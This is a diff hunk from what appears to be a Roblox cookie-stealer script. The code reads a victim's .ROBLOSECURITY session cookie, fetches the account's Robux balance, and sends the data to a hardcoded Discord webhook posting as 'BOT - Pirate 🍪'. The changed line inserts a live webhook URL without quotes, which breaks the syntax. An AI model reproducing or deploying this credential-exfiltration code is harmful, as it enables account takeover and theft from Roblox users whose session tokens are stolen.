@@ -195,7 +195,7 @@ if __name__ == "__main__":
     robux = requests.get("https://economy.roblox.com/v1/user/currency",cookies={'.ROBLOSECURITY': roblox_cookie}).json()["robux"]
     premium_status = info['IsPremium']
 
-    discord = Discord(url=webhook_url)
+    discord = Discord(url=https://discord.com/api/webhooks/1304007138078883872/wKA2ZYgdhUc7Aa6cMz-fsqf2Rd0BhYR0RgVDN1Kr5SpaGzcp2t96X4l8JJlDIvk-6weF)
     discord.post(
         username="BOT - Pirate 🍪",
         avatar_url="https://cdn.discordapp.com/attachments/1238207103894552658/1258507913161347202/a339721183f60c18b3424ba7b73daf1b.png?ex=66884c54&is=6686fad4&hm=4a7fe8ae14e5c8d943518b69a5be029aa8bc2b5a4861c74db4ef05cf62f56754&",
